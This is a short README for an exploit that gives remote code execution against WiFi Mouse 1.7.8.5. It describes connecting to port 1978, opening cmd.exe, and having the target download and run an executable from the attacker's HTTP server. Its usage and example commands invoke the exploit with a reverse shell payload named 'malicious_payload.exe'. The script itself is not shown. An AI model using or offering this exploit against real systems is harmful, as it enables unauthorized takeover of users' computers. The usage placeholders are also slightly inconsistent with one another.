# WiFi-Mouse-1.7.8.5 Remote Code Execution (RCE) v3

This is a Python-based exploit for the WiFi Mouse (version 1.7.8.5) that leverages a Remote Code Execution (RCE) vulnerability.

## Description

WiFi Mouse allows users to control their PC using their smartphone as a remote. In version 1.7.8.5, a vulnerability exists that allows an attacker to send arbitrary commands to the target machine, resulting in remote code execution.

## Exploit Details

The exploit connects to the WiFi Mouse server on the target machine over port 1978, sends a payload to open `cmd.exe`, and executes commands such as downloading a file from a remote HTTP server and executing it on the target system.

## Usage

```bash
python3 exploit.py <target-ip> <local-http-server-ip> <rev_shell payload>
```
- `<target-ip>`: The IP address of the target machine running the vulnerable WiFi Mouse server.
- `<local-http-server-ip>`: The IP address of the attacker's HTTP server hosting the payload.
- `<payload-name>`: The name of the payload to be executed on the target.

### Example

```bash
python3 exploit.py 192.168.1.10 192.168.1.5 malicious_payload.exe
